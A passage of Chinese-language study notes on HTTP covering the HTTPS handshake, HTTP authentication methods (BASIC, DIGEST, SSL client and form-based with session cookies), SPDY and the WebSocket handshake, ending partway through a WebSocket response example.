<p>由自认证机构颁发的服务器证书之所以不起作用，是因为它无法 消除伪装的可能性。自认证机构能够产生的作用顶多也就是自己 对外宣称“我是○○”的这种程度。即使采用自签名证书，通过 SSL 加密之后，可能偶尔还会看见通信处在安全状态的提示，可那也 是有问题的。因为 就算加密通信，也不能排除正在和已经过伪 装的假服务器保持通信。</p>
<p>值得信赖的第三方机构介入认证，才能让已植入在浏览器内的认 证机构颁布的公开密钥发挥作用，并借此证明服务器的真实性。</p>
<p>中级认证机构的证书可能会变成自认证证书</p>
<p>多数浏览器内预先已植入备受信赖的认证机构的证书，但也有一 小部分浏览器会植入中级认证机构的证书。</p>
<p>对于中级认证机构颁发的服务器证书，某些浏览器会以正规的证 书来对待，可有的浏览器会当作自签名证书。</p>
<h4 id="https-的安全通信机制" tabindex="-1"><a class="header-anchor" href="#https-的安全通信机制" aria-hidden="true">#</a> HTTPS 的安全通信机制</h4>
<p>为了更好地理解 HTTPS，我们来观察一下 HTTPS 的通信步骤。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805095619279.png" alt="image-20220805095619279"></p>
<p>步骤 1： 客户端通过发送 Client Hello 报文开始 SSL通信。报文中包 含客户端支持的 SSL的指定版本、加密组件（Cipher Suite）列表（所 使用的加密算法及密钥长度等）。</p>
<p>步骤 2： 服务器可进行 SSL通信时，会以 Server Hello 报文作为应答。和客户端一样，在报文中包含 SSL版本以及加密组件。服务器的 加密组件内容是从接收到的客户端加密组件内筛选出来的。</p>
<p>步骤 3： 之后服务器发送 Certificate 报文。报文中包含公开密钥证 书。</p>
<p>步骤 4： 最后服务器发送 Server Hello Done 报文通知客户端，最初阶段的 SSL握手协商部分结束。</p>
<p>步骤 5： SSL第一次握手结束之后，客户端以 Client Key Exchange 报 文作为回应。报文中包含通信加密中使用的一种被称为 Pre-master secret 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。</p>
<p>步骤 6： 接着客户端继续发送 Change Cipher Spec 报文。该报文会提 示服务器，在此报文之后的通信会采用 Pre-master secret 密钥加密。</p>
<p>步骤 7： 客户端发送 Finished 报文。该报文包含连接至今全部报文的 整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确 解密该报文作为判定标准。</p>
<p>步骤 8： 服务器同样发送 Change Cipher Spec 报文。</p>
<p>步骤 9： 服务器同样发送 Finished 报文。</p>
<p>步骤 10： 服务器和客户端的 Finished 报文交换完毕之后，SSL连接 就算建立完成。当然，通信会受到 SSL的保护。从此处开始进行应用 层协议的通信，即发送 HTTP 请求。</p>
<p>步骤 11： 应用层协议通信，即发送 HTTP 响应。</p>
<p>步骤 12： 最后由客户端断开连接。断开连接时，发送 close_notify 报 文。上图做了一些省略，这步之后再发送 TCP FIN 报文来关闭与 TCP 的通信。</p>
<p>在以上流程中，应用层发送数据时会附加一种叫做 MAC（Message Authentication Code）的报文摘要。MAC 能够查知报文是否遭到篡 改，从而保护报文的完整性。</p>
<p>下面是对整个流程的图解。图中说明了从仅使用服务器端的公开密钥 证书（服务器证书）建立 HTTPS 通信的整个过程。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805100914512.png" alt="image-20220805100914512"></p>
<blockquote>
<p>CBC 模式（Cipher Block Chaining）又名密码分组链接模式。在此模式下，将前 一个明文块加密处理后和下一个明文块做 XOR 运算，使之重叠，然后再对运算 结果做加密处理。对第一个明文块做加密时，要么使用前一段密文的最后一块， 要么利用外部生成的初始向量（initial vector，IV）。</p>
</blockquote>
<ul>
<li>SSL 和 TLS</li>
</ul>
<p>HTTPS 使用 SSL（Secure Socket Layer） 和 TLS（Transport Layer Security）这两个协议。</p>
<p>SSL技术最初是由浏览器开发商网景通信公司率先倡导的，开发 过 SSL3.0 之前的版本。目前主导权已转移到 IETF（Internet Engineering Task Force，Internet 工程任务组）的手中。</p>
<p>IETF 以 SSL3.0 为基准，后又制定了 TLS1.0、TLS1.1 和 TLS1.2。TSL是以 SSL为原型开发的协议，有时会统一称该协议 为 SSL。当前主流的版本是 SSL3.0 和 TLS1.0。</p>
<p>由于 SSL1.0 协议在设计之初被发现出了问题，就没有实际投入 使用。SSL2.0 也被发现存在问题，所以很多浏览器直接废除了 该协议版本。</p>
<ul>
<li>SSL 速度慢吗</li>
</ul>
<p>HTTPS 也存在一些问题，那就是当使用 SSL时，它的处理速度会变慢。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805101427558.png" alt="image-20220805101427558"></p>
<p>SSL的慢分两种。一种是指通信慢。另一种是指由于大量消耗 CPU 及内存等资源，导致处理速度变慢。</p>
<p>和使用 HTTP 相比，网络负载可能会变慢 2 到 100 倍。除去和 TCP 连接、发送 HTTP 请求 • 响应以外，还必须进行 SSL通信， 因此整体上处理通信量不可避免会增加。</p>
<p>另一点是 SSL必须进行加密处理。在服务器和客户端都需要进行 加密和解密的运算处理。因此从结果上讲，比起 HTTP 会更多地 消耗服务器和客户端的硬件资源，导致负载增强。</p>
<p>针对速度变慢这一问题，并没有根本性的解决方案，我们会使用 SSL加速器这种（专用服务器）硬件来改善该问题。该硬件为 SSL通信专用硬件，相对软件来讲，能够提高数倍 SSL的计算速 度。仅在 SSL处理时发挥 SSL加速器的功效，以分担负载。</p>
<blockquote>
<p><strong>为什么不一直使用 HTTPS</strong></p>
<p>既然 HTTPS 那么安全可靠，那为何所有的 Web 网站不一直使用 HTTPS ？</p>
<p>其中一个原因是，因为与纯文本通信相比，加密通信会消耗更多的 CPU 及内存资源。如果每次通信都加密，会消耗相当多的资源，平 摊到一台计算机上时，能够处理的请求数量必定也会随之减少。</p>
<p>因此，如果是非敏感信息则使用 HTTP 通信，只有在包含个人信息 等敏感数据时，才利用 HTTPS 加密通信。</p>
<p>特别是每当那些访问量较多的 Web 网站在进行加密处理时，它们 所承担着的负载不容小觑。在进行加密处理时，并非对所有内容都 进行加密处理，而是仅在那些需要信息隐藏时才会加密，以节约资 源。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805102210739.png" alt="image-20220805102210739"></p>
<p>除此之外，想要节约购买证书的开销也是原因之一。</p>
<p>要进行 HTTPS 通信，证书是必不可少的。而使用的证书必须向认 证机构（CA）购买。证书价格可能会根据不同的认证机构略有不 同。通常，一年的授权需要数万日元（现在一万日元大约折合 600 人民币）。</p>
<p>那些购买证书并不合算的服务以及一些个人网站，可能只会选择采 用 HTTP 的通信方式。</p>
</blockquote>
<h2 id="确认访问用户身份的认证" tabindex="-1"><a class="header-anchor" href="#确认访问用户身份的认证" aria-hidden="true">#</a> 确认访问用户身份的认证</h2>
<h3 id="何为认证" tabindex="-1"><a class="header-anchor" href="#何为认证" aria-hidden="true">#</a> 何为认证</h3>
<p>计算机本身无法判断坐在显示器前的使用者的身份。进一步说，也无 法确认网络的那头究竟有谁。可见，为了弄清究竟是谁在访问服务 器，就得让对方的客户端自报家门。</p>
<p>可是，就算正在访问服务器的对方声称自己是ueno，身份是否属实这 点却也无从谈起。为确认 ueno 本人是否真的具有访问系统的权限， 就需要核对“登录者本人才知道的信息”、“登录者本人才会有的信 息”。</p>
<p>核对的信息通常是指以下这些。</p>
<ul>
<li>密码：只有本人才会知道的字符串信息。</li>
<li>动态令牌：仅限本人持有的设备内显示的一次性密码。</li>
<li>数字证书：仅限本人（终端）持有的信息。</li>
<li>生物认证：指纹和虹膜等本人的生理信息。</li>
<li>IC 卡等：仅限本人持有的信息。</li>
</ul>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805103541481.png" alt="image-20220805103541481"></p>
<p><strong>HTTP 使用的认证方式</strong></p>
<p>HTTP/1.1 使用的认证方式如下所示。</p>
<ul>
<li>BASIC 认证（基本认证）</li>
<li>DIGEST 认证（摘要认证）</li>
<li>SSL 客户端认证</li>
<li>FormBase 认证（基于表单认证）</li>
</ul>
<p>此外，还有 Windows 统一认证（Keberos 认证、NTLM 认证），</p>
<h3 id="basic-认证" tabindex="-1"><a class="header-anchor" href="#basic-认证" aria-hidden="true">#</a> BASIC 认证</h3>
<p>BASIC 认证（基本认证）是从 HTTP/1.0 就定义的认证方式。即便是 现在仍有一部分的网站会使用这种认证方式。是 Web 服务器与通信 客户端之间进行的认证方式。</p>
<p>步骤 1： 当请求的资源需要 BASIC 认证时，服务器会随状态码 401 Authorization Required，返回带 WWW-Authenticate 首部字段的响应。 该字段内包含认证的方式（BASIC） 及 Request-URI 安全域字符串 （realm）。</p>
<p>步骤 2： 接收到状态码 401 的客户端为了通过 BASIC 认证，需要将 用户 ID 及密码发送给服务器。发送的字符串内容是由用户 ID 和密码 构成，两者中间以冒号（:）连接后，再经过 Base64 编码处理。</p>
<p>假设用户 ID 为 guest，密码是 guest，连接起来就会形成 guest:guest 这 样的字符串。然后经过 Base64 编码，最后的结果即是 Z3Vlc3Q6Z3Vlc3Q=。把这串字符串写入首部字段 Authorization 后， 发送请求。</p>
<p>当用户代理为浏览器时，用户仅需输入用户 ID 和密码即可，之后， 浏览器会自动完成到 Base64 编码的转换工作。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805104637617.png" alt="image-20220805104637617"></p>
<p>步骤 3： 接收到包含首部字段 Authorization 请求的服务器，会对认证 信息的正确性进行验证。如验证通过，则返回一条包含 Request-URI 资源的响应。</p>
<p>BASIC 认证虽然采用 Base64 编码方式，但这不是加密处理。不需要 任何附加信息即可对其解码。换言之，由于明文解码后就是用户 ID 和密码，在 HTTP 等非加密通信的线路上进行 BASIC 认证的过程 中，如果被人窃听，被盗的可能性极高。</p>
<p>另外，除此之外想再进行一次 BASIC 认证时，一般的浏览器却无法 实现认证注销操作，这也是问题之一。</p>
<p>BASIC 认证使用上不够便捷灵活，且达不到多数 Web 网站期望的安 全性等级，因此它并不常用。</p>
<h3 id="digest-认证" tabindex="-1"><a class="header-anchor" href="#digest-认证" aria-hidden="true">#</a> DIGEST 认证</h3>
<p>为弥补 BASIC 认证存在的弱点，从 HTTP/1.1 起就有了 DIGEST 认 证。 DIGEST 认证同样使用质询 / 响应的方式 （challenge/response），但不会像 BASIC 认证那样直接发送明文密 码。</p>
<p>所谓质询响应方式是指，一开始一方会先发送认证要求给另一方，接 着使用从另一方那接收到的质询码计算生成响应码。最后将响应码返 回给对方进行认证的方式。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805104852486.png" alt="image-20220805104852486"></p>
<p>因为发送给对方的只是响应摘要及由质询码产生的计算结果，所以比 起 BASIC 认证，密码泄露的可能性就降低了。</p>
<p><strong>DIGEST 认证的认证步骤</strong></p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805104947011.png" alt="image-20220805104947011"></p>
<p><strong>步骤 1</strong>： 请求需认证的资源时，服务器会随着状态码 401 Authorization Required，返 回带 WWW-Authenticate 首部字段的响应。 该字段内包含质问响应方式认证所需的临时质询码（随机数， nonce）。</p>
<p>首部字段 WWW-Authenticate 内必须包含 realm 和 nonce 这两个字段的 信息。客户端就是依靠向服务器回送这两个值进行认证的。</p>
<p>nonce 是一种每次随返回的 401 响应生成的任意随机字符串。该字符 串通常推荐由 Base64 编码的十六进制数的组成形式，但实际内容依 赖服务器的具体实现。</p>
<p><strong>步骤 2</strong>： 接收到 401 状态码的客户端，返回的响应中包含 DIGEST 认 证必须的首部字段 Authorization 信息。</p>
<p>首部字段 Authorization 内必须包含 username、realm、nonce、uri 和 response 的字段信息。其中，realm 和 nonce 就是之前从服务器接收到 的响应中的字段。</p>
<p>username 是 realm 限定范围内可进行认证的用户名。</p>
<p>uri（digest-uri）即 Request-URI 的值，但考虑到经代理转发后 Request-URI 的值可能被修改，因此事先会复制一份副本保存在 uri 内。</p>
<p>response 也可叫做 Request-Digest，存放经过 MD5 运算后的密码字符 串，形成响应码。</p>
<p>响应中其他的实体请参见请求首部字段 Authorization。\</p>
<p><strong>步骤 3</strong>： 接收到包含首部字段 Authorization 请求的服务器，会确认认 证信息的正确性。认证通过后则返回包含 Request-URI 资源的响应。</p>
<p>并且这时会在首部字段 Authentication-Info 写入一些认证成功的相关信息。</p>
<p>DIGEST 认证提供了高于 BASIC 认证的安全等级，但是和 HTTPS 的 客户端认证相比仍旧很弱。DIGEST 认证提供防止密码被窃听的保护 机制，但并不存在防止用户伪装的保护机制。</p>
<p>DIGEST 认证和 BASIC 认证一样，使用上不那么便捷灵活，且仍达不 到多数 Web 网站对高度安全等级的追求标准。因此它的适用范围也 有所受限。</p>
<h3 id="ssl-客户端认证" tabindex="-1"><a class="header-anchor" href="#ssl-客户端认证" aria-hidden="true">#</a> SSL 客户端认证</h3>
<p>从使用用户 ID 和密码的认证方式方面来讲，只要二者的内容正确， 即可认证是本人的行为。但如果用户 ID 和密码被盗，就很有可能被 第三者冒充。利用 SSL客户端认证则可以避免该情况的发生。</p>
<p>SSL客户端认证是借由 HTTPS 的客户端证书完成认证的方式。凭借 客户端证书（在 HTTPS 一章已讲解）认证，服务器可确认访问是否 来自已登录的客户端。</p>
<h4 id="ssl-客户端认证的认证步骤" tabindex="-1"><a class="header-anchor" href="#ssl-客户端认证的认证步骤" aria-hidden="true">#</a> SSL 客户端认证的认证步骤</h4>
<p>为达到 SSL客户端认证的目的，需要事先将客户端证书分发给客户 端，且客户端必须安装此证书。</p>
<p>步骤 1： 接收到需要认证资源的请求，服务器会发送 Certificate Request 报文，要求客户端提供客户端证书。</p>
<p>步骤 2： 用户选择将发送的客户端证书后，客户端会把客户端证书信 息以 Client Certificate 报文方式发送给服务器。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805141958638.png" alt="image-20220805141958638"></p>
<p>图：选择客户端证书示例（三菱东京 UFJ 银行）</p>
<p>步骤 3： 服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信。</p>
<h4 id="ssl-客户端认证采用双因素认证" tabindex="-1"><a class="header-anchor" href="#ssl-客户端认证采用双因素认证" aria-hidden="true">#</a> SSL 客户端认证采用双因素认证</h4>
<p>在多数情况下，SSL客户端认证不会仅依靠证书完成认证，一般会和 基于表单认证（稍后讲解）组合形成一种双因素认证（Two-factor authentication）来使用。所谓双因素认证就是指，认证过程中不仅需 要密码这一个因素，还需要申请认证者提供其他持有信息，从而作为 另一个因素，与其组合使用的认证方式。</p>
<p>换言之，第一个认证因素的 SSL客户端证书用来认证客户端计算机， 另一个认证因素的密码则用来确定这是用户本人的行为。</p>
<p>通过双因素认证后，就可以确认是用户本人正在使用匹配正确的计算 机访问服务器。</p>
<h4 id="ssl-客户端认证必要的费用" tabindex="-1"><a class="header-anchor" href="#ssl-客户端认证必要的费用" aria-hidden="true">#</a> SSL 客户端认证必要的费用</h4>
<p>使用 SSL客户端认证需要用到客户端证书。而客户端证书需要支付一 定费用才能使用。</p>
<p>这里提到的费用是指，从认证机构购买客户端证书的费用，以及服务器运营者为保证自己搭建的认证机构安全运营所产生的费用。</p>
<p>每个认证机构颁发客户端证书的费用不尽相同，平摊到一张证书上， 一年费用约几万至十几万日元。服务器运营者也可以自己搭建认证机构，但要维持安全运行就会产生相应的费用。</p>
<h3 id="基于表单认证" tabindex="-1"><a class="header-anchor" href="#基于表单认证" aria-hidden="true">#</a> 基于表单认证</h3>
<p>基于表单的认证方法并不是在 HTTP 协议中定义的。客户端会向服务 器上的 Web 应用程序发送登录信息（Credential），按登录信息的验 证结果认证。</p>
<p>根据 Web 应用程序的实际安装，提供的用户界面及认证方式也各不相同。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805143123613.png" alt="image-20220805143123613"></p>
<p>图：基于表单认证示例（Google）</p>
<p>多数情况下，输入已事先登录的用户 ID（通常是任意字符串或邮件 地址）和密码等登录信息后，发送给 Web 应用程序，基于认证结果 来决定认证是否成功。</p>
<h4 id="认证多半为基于表单认证" tabindex="-1"><a class="header-anchor" href="#认证多半为基于表单认证" aria-hidden="true">#</a> 认证多半为基于表单认证</h4>
<p>由于使用上的便利性及安全性问题，HTTP 协议标准提供的 BASIC 认 证和 DIGEST 认证几乎不怎么使用。另外，SSL客户端认证虽然具有 高度的安全等级，但因为导入及维持费用等问题，还尚未普及。</p>
<p>比如 SSH 和 FTP 协议，服务器与客户端之间的认证是合乎标准规范 的，并且满足了最基本的功能需求上的安全使用级别，因此这些协议 的认证可以拿来直接使用。但是对于 Web 网站的认证功能，能够满 足其安全使用级别的标准规范并不存在，所以只好使用由 Web 应用 程序各自实现基于表单的认证方式。</p>
<p>不具备共同标准规范的表单认证，在每个 Web 网站上都会有各不相 同的实现方式。如果是全面考虑过安全性能而实现的表单认证，那么 就能够具备高度的安全等级。但在表单认证的实现中存在问题的 Web 网站也是屡见不鲜。</p>
<h4 id="session-管理及-cookie-应用" tabindex="-1"><a class="header-anchor" href="#session-管理及-cookie-应用" aria-hidden="true">#</a> Session 管理及 Cookie 应用</h4>
<p>基于表单认证的标准规范尚未有定论，一般会使用 Cookie 来管理 Session（会话）。</p>
<p>基于表单认证本身是通过服务器端的 Web 应用，将客户端发送过来 的用户 ID 和密码与之前登录过的信息做匹配来进行认证的。</p>
<p>但鉴于 HTTP 是无状态协议，之前已认证成功的用户状态无法通过协 议层面保存下来。即，无法实现状态管理，因此即使当该用户下一次 继续访问，也无法区分他与其他的用户。于是我们会使用 Cookie 来 管理 Session，以弥补 HTTP 协议中不存在的状态管理功能。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805143616591.png" alt="image-20220805143616591"></p>
<p>图：Session 管理及 Cookie 状态管理</p>
<p><strong>步骤 1</strong>： 客户端把用户 ID 和密码等登录信息放入报文的实体部分， 通常是以 POST 方法把请求发送给服务器。而这时，会使用 HTTPS 通信来进行 HTML表单画面的显示和用户输入数据的发送。</p>
<p><strong>步骤 2</strong>： 服务器会发放用以识别用户的 Session ID。通过验证从客户 端发送过来的登录信息进行身份认证，然后把用户的认证状态与 Session ID 绑定后记录在服务器端。</p>
<p>向客户端返回响应时，会在首部字段 Set-Cookie 内写入 Session ID（如 PHPSESSID=028a8c…）。</p>
<p>你可以把 Session ID 想象成一种用以区分不同用户的等位号。</p>
<p>然而，如果 Session ID 被第三方盗走，对方就可以伪装成你的身份进 行恶意操作了。因此必须防止 Session ID 被盗，或被猜出。为了做到 这点，Session ID 应使用难以推测的字符串，且服务器端也需要进行 有效期的管理，保证其安全性。</p>
<p>另外，为减轻跨站脚本攻击（XSS）造成的损失，建议事先在 Cookie 内加上 httponly 属性。</p>
<p><strong>步骤 3</strong>： 客户端接收到从服务器端发来的 Session ID 后，会将其作为 Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送 Cookie，所以 Session ID 也随之发送到服务器。服务器端可通过验证 接收到的 Session ID 识别用户和其认证状态。</p>
<p>除了以上介绍的应用实例，还有应用其他不同方法的案例。</p>
<p>另外，不仅基于表单认证的登录信息及认证过程都无标准化的方法， 服务器端应如何保存用户提交的密码等登录信息等也没有标准化。</p>
<p>通常，一种安全的保存方法是，先利用给密码加盐（salt） 的方式增 加额外信息，再使用散列（hash）函数计算出散列值后保存。但是我 们也经常看到直接保存明文密码的做法，而这样的做法具有导致密码 泄露的风险。</p>
<blockquote>
<p>salt 其实就是由服务器随机生成的一个字符串，但是要保证长度足够长，并且是真正随机生成的。然后把它和密码字符串相连接（前后都可以）生成散列值。当 两个用户使用了同一个密码时，由于随机生成的 salt 值不同，对应的散列值也将 是不同的。这样一来，很大程度上减少了密码特征，攻击者也就很难利用自己手 中的密码特征库进行破解。</p>
</blockquote>
<h2 id="基于-http-的功能追加-协议" tabindex="-1"><a class="header-anchor" href="#基于-http-的功能追加-协议" aria-hidden="true">#</a> 基于 HTTP 的功能追加 协议</h2>
<h3 id="基于-http-的协议" tabindex="-1"><a class="header-anchor" href="#基于-http-的协议" aria-hidden="true">#</a> 基于 HTTP 的协议</h3>
<p>在建立 HTTP 标准规范时，制订者主要想把 HTTP 当作传输 HTML文档的协议。</p>
<h3 id="消除-http-瓶颈的-spdy" tabindex="-1"><a class="header-anchor" href="#消除-http-瓶颈的-spdy" aria-hidden="true">#</a> 消除 HTTP 瓶颈的 SPDY</h3>
<p>Google 在 2010 年发布了 SPDY（取自 SPeeDY，发音同 speedy），其 开发目标旨在解决 HTTP 的性能瓶颈，缩短 Web 页面的加载时间 （50%）。</p>
<h4 id="http-的瓶颈" tabindex="-1"><a class="header-anchor" href="#http-的瓶颈" aria-hidden="true">#</a> HTTP 的瓶颈</h4>
<p>在 Facebook 和 Twitter 等 SNS 网站上，几乎能够实时观察到海量用户 公开发布的内容，这也是一种乐趣。当几百、几千万的用户发布内容 时，Web 网站为了保存这些新增内容，在很短的时间内就会发生大量 的内容更新。</p>
<p>为了尽可能实时地显示这些更新的内容，服务器上一有内容更新，就 需要直接把那些内容反馈到客户端的界面上。虽然看起来挺简单的， 但 HTTP 却无法妥善地处理好这项任务。</p>
<p>使用 HTTP 协议探知服务器上是否有内容更新，就必须频繁地从客户 端到服务器端进行确认。如果服务器上没有内容更新，那么就会产生 徒劳的通信。</p>
<p>若想在现有 Web 实现所需的功能，以下这些 HTTP 标准就会成为瓶 颈。</p>
<ul>
<li>一条连接上只可发送一个请求。</li>
<li>请求只能从客户端开始。客户端不可以接收除响应以外的指 令。</li>
<li>请求 / 响应首部未经压缩就发送。首部信息越多延迟越大。</li>
<li>发送冗长的首部。每次互相发送相同的首部造成的浪费较 多。</li>
<li>可任意选择数据压缩格式。非强制压缩发送。</li>
</ul>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805145036906.png" alt="image-20220805145036906"></p>
<p>图：以前的 HTTP 通信</p>
<p><strong>Ajax 的解决方法</strong></p>
<p>Ajax（Asynchronous JavaScript and XML， 异 步 JavaScript 与 XML技 术）是一种有效利用 JavaScript 和 DOM（Document Object Model，文 档对象模型）的操作，以达到局部 Web 页面替换加载的异步通信手 段。和以前的同步通信相比，由于它只更新一部分页面，响应中传输 的数据量会因此而减少，这一优点显而易见。</p>
<p>Ajax 的核心技术是名为 XMLHttpRequest 的 API，通过 JavaScript 脚本 语言的调用就能和服务器进行 HTTP 通信。借由这种手段，就能从已 加载完毕的 Web 页面上发起请求，只更新局部页面。</p>
<p>而利用 Ajax 实时地从服务器获取内容，有可能会导致大量请求产 生。另外，Ajax 仍未解决 HTTP 协议本身存在的问题。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805145256153.png" alt="image-20220805145256153"></p>
<p>图：Ajax 通信</p>
<p><strong>Comet 的解决方法</strong></p>
<p>一旦服务器端有内容更新了，Comet 不会让请求等待，而是直接给客 户端返回响应。这是一种通过延迟应答，模拟实现服务器端向客户端 推送（Server Push）的功能。</p>
<p>通常，服务器端接收到请求，在处理完毕后就会立即返回响应，但为 了实现推送功能，Comet 会先将响应置于挂起状态，当服务器端有内 容更新时，再返回该响应。因此，服务器端一旦有更新，就可以立即 反馈给客户端。</p>
<p>内容上虽然可以做到实时更新，但为了保留响应，一次连接的持续时 间也变长了。期间，为了维持连接会消耗更多的资源。另外，Comet 也仍未解决 HTTP 协议本身存在的问题。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805145540062.png" alt="image-20220805145540062"></p>
<p>图：Comet 通信</p>
<p><strong>SPDY的目标</strong></p>
<p>陆续出现的 Ajax 和 Comet 等提高易用性的技术，一定程度上使 HTTP 得到了改善，但 HTTP 协议本身的限制也令人有些束手无策。为了进 行根本性的改善，需要有一些协议层面上的改动。</p>
<p>处于持续开发状态中的 SPDY 协议，正是为了在协议级别消除 HTTP 所遭遇的瓶颈。</p>
<h4 id="spdy的设计与功能" tabindex="-1"><a class="header-anchor" href="#spdy的设计与功能" aria-hidden="true">#</a> SPDY的设计与功能</h4>
<p>SPDY 没有完全改写 HTTP 协议，而是在 TCP/IP 的应用层与运输层之 间通过新加会话层的形式运作。同时，考虑到安全性问题，SPDY 规 定通信中使用 SSL。</p>
<p>SPDY 以会话层的形式加入，控制对数据的流动，但还是采用 HTTP 建立通信连接。因此，可照常使用 HTTP 的 GET 和 POST 等方 法、 Cookie 以及 HTTP 报文等。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220805145726790.png" alt="image-20220805145726790"></p>
<p>图：SPDY的设计</p>
<p>使用 SPDY 后，HTTP 协议额外获得以下功能。</p>
<p><strong>多路复用流</strong></p>
<p>通过单一的 TCP 连接，可以无限制处理多个 HTTP 请求。所有请求 的处理都在一条 TCP 连接上完成，因此 TCP 的处理效率得到提高。</p>
<p><strong>赋予请求优先级</strong></p>
<p>SPDY 不仅可以无限制地并发处理请求，还可以给请求逐个分配优先 级顺序。这样主要是为了在发送多个请求时，解决因带宽低而导致响 应变慢的问题。</p>
<p><strong>压缩 HTTP 首部</strong></p>
<p>压缩 HTTP 请求和响应的首部。这样一来，通信产生的数据包数量和 发送的字节数就更少了。</p>
<p><strong>推送功能</strong></p>
<p>支持服务器主动向客户端推送数据的功能。这样，服务器可直接发送 数据，而不必等待客户端的请求。</p>
<p><strong>服务器提示功能</strong></p>
<p>服务器可以主动提示客户端请求所需的资源。由于在客户端发现资源 之前就可以获知资源的存在，因此在资源已缓存等情况下，可以避免发送不必要的请求。</p>
<h4 id="spdy消除-web-瓶颈了吗" tabindex="-1"><a class="header-anchor" href="#spdy消除-web-瓶颈了吗" aria-hidden="true">#</a> SPDY消除 Web 瓶颈了吗</h4>
<p>希望使用 SPDY 时，Web 的内容端不必做什么特别改动，而 Web 浏 览器及 Web 服务器都要为对应 SPDY 做出一定程度上的改动。有好 几家 Web 浏览器已经针对 SPDY 做出了相应的调整。另外，Web 服 务器也进行了实验性质的应用，但把该技术导入实际的 Web 网站却 进展不佳。</p>
<p>因为 SPDY 基本上只是将单个域名（ IP 地址）的通信多路复用，所 以当一个 Web 网站上使用多个域名下的资源，改善效果就会受到限 制。</p>
<p>SPDY 的确是一种可有效消除 HTTP 瓶颈的技术，但很多 Web 网站存 在的问题并非仅仅是由 HTTP 瓶颈所导致。对 Web 本身的速度提 升，还应该从其他可细致钻研的地方入手，比如改善 Web 内容的编 写方式等。</p>
<h3 id="使用浏览器进行全双工通信的-websocket" tabindex="-1"><a class="header-anchor" href="#使用浏览器进行全双工通信的-websocket" aria-hidden="true">#</a> 使用浏览器进行全双工通信的 WebSocket</h3>
<p>利用 Ajax 和 Comet 技术进行通信可以提升 Web 的浏览速度。但问题 在于通信若使用 HTTP 协议，就无法彻底解决瓶颈问题。WebSocket 网络技术正是为解决这些问题而实现的一套新协议及 API。</p>
<p>当时筹划将 WebSocket 作为 HTML5 标准的一部分，而现在它却逐渐 变成了独立的协议标准。WebSocket 通信协议在 2011 年 12 月 11 日， 被 RFC 6455 - The WebSocket Protocol 定为标准。</p>
<h4 id="websocket-的设计与功能" tabindex="-1"><a class="header-anchor" href="#websocket-的设计与功能" aria-hidden="true">#</a> WebSocket 的设计与功能</h4>
<p>WebSocket，即 Web 浏览器与 Web 服务器之间全双工通信标准。其 中，WebSocket 协议由 IETF 定为标准，WebSocket API 由 W3C 定为 标准。仍在开发中的 WebSocket 技术主要是为了解决 Ajax 和 Comet 里 XMLHttpRequest 附带的缺陷所引起的问题。</p>
<h4 id="websocket-协议" tabindex="-1"><a class="header-anchor" href="#websocket-协议" aria-hidden="true">#</a> WebSocket 协议</h4>
<p>一旦 Web 服务器与客户端之间建立起 WebSocket 协议的通信连接， 之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送 JSON、XML、HTML或图片等任意格式的数据。</p>
<p>由于是建立在 HTTP 基础上的协议，因此连接的发起方仍是客户端， 而一旦确立 WebSocket 通信连接，不论服务器还是客户端，任意一方 都可直接向对方发送报文。</p>
<p>下面我们列举一下 WebSocket 协议的主要特点。</p>
<p><strong>推送功能</strong></p>
<p>支持由服务器向客户端推送数据的推送功能。这样，服务器可直接发 送数据，而不必等待客户端的请求。</p>
<p><strong>减少通信量</strong></p>
<p>只要建立起 WebSocket 连接，就希望一直保持连接状态。和 HTTP 相 比，不但每次连接时的总开销减少，而且由于 WebSocket 的首部信息 很小，通信量也相应减少了。</p>
<p>为了实现 WebSocket 通信，在 HTTP 连接建立之后，需要完成一 次“握手”（Handshaking）的步骤。</p>
<ul>
<li>握手·请求</li>
</ul>
<p>为了实现 WebSocket 通信，需要用到 HTTP 的 Upgrade 首部字 段，告知服务器通信协议发生改变，以达到握手的目的。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: http://example.com
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Sec-WebSocket-Key 字段内记录着握手过程中必不可少的键值。 Sec-WebSocket-Protocol 字段内记录使用的子协议。</p>
<p>子协议按 WebSocket 协议标准在连接分开使用时，定义那些连接的名称。</p>
<ul>
<li>握手·响应</li>
</ul>
<p>对于之前的请求，返回状态码 101 Switching Protocols 的响应。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
